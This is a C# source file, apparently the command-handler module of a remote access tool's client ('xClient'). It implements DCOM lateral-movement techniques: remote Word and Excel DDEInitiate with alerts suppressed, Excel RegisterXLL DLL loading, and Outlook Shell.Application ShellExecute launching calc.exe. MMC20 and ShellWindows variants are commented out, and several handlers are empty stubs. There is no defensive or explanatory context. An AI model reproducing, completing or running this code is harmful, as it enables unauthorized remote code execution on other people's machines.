using Microsoft.VisualBasic;
using System;
//using SHDocVw;

using System.Text;
//using Microsoft.VisualBasic;

namespace xClient.Core.Commands
{
    public static partial class CommandHandler
    {
        public static void HandledoMSWORDDDE()
        {
            //Done
            string target = "";
            string arguments = "";
            string process = "";
            var wordApp = (Microsoft.Office.Interop.Word.Application)Interaction.CreateObject("Word.Application", target);
            wordApp.DisplayAlerts = Microsoft.Office.Interop.Word.WdAlertLevel.wdAlertsNone;
            wordApp.DDEInitiate(process, arguments);
        }
        public static void HandledoExcelDDE()
        {
            //Done
            string target = "";
            string process = "";
            string arguments = "";
            var excelApp = (Microsoft.Office.Interop.Excel.Application)Interaction.CreateObject("Excel.Application", target);
            excelApp.DisplayAlerts = false;
            excelApp.DDEInitiate(process, arguments);
            
        }

        public static void HandleDoRegisterXLL()
        {

            //Done
            string target = "";
            string command = "";
            var excelApp = (Microsoft.Office.Interop.Excel.Application)Interaction.CreateObject("Excel.Application", target);
            excelApp.RegisterXLL(command/**path to dll**/);
        }

        public static void HandledoMMCDCOM()
        {
            //May Need to validate the ExecuteShellCommand parameters are correct.
            //Done
            //Requires AxImp.exe which is foudn in the Windows SDK. Would this cause issues with client?
            string target = "";
            string process = "";
            string arguments = "";
            //var MMC = ((MMC20.Application)Interaction.CreateObject("MMC20.Application", target));
            //MMC.Document.ActiveView.ExecuteShellCommand(process, null, arguments, "7");    
        }

        public static void HandledoShellWindowsDCOM()
        {
            string target = "";
            string command = "";
            //var shellWindows = (ShellWindows)Type.GetTypeFromCLSID(new Guid("9BA05972-F6A8-11CF-A442-00A0C90A8F39"), target);
            

            
        }

        public static void HandleDoShellBrowserWindowDCOM()
        {

        }

        public static void HandleDoVisioAddonDCOM()
        {

        }

        public static void HandleDoOutlookExecutionDCOM()
        {
            //ShellExecute didn't auto complete but it also didn't error out. Need to figure out if this is correct code or not.
            string target = "";
            var outlookApp = (Microsoft.Office.Interop.Outlook.Application)Interaction.CreateObject("Outlook.Application", target);
            var obj = outlookApp.CreateObject("Shell.Application");
            obj.ShellExecute("calc.exe");
        }

        public static void HandleDoArbitraryLibraryLoadDCOM()
        {

        }

        public static void HandleDoMSWORDWLLAddinDCOM()
        { 
            //Not supported on 64-bit word.
            string target = "";
            string arguments = "";
            string process = "";
            //var wordApp = (Microsoft.Office.Interop.Word.Application)Interaction.CreateObject("Word.Application", target);
        }
        public static void HandleDoOutlookScriptDCOM()
        {
            string target = "";
            //var outlookApp = (Microsoft.Office.Interop.Outlook.Application)Interaction.CreateObject("MSScriptControl.ScriptControl", target);
            var obj = "";

        }

        public static void HandleDoVisioExecuteLineDCOM()
        {

        }

        public static void HandleOfficeMacroDCOM()
        {

        }
    }
}
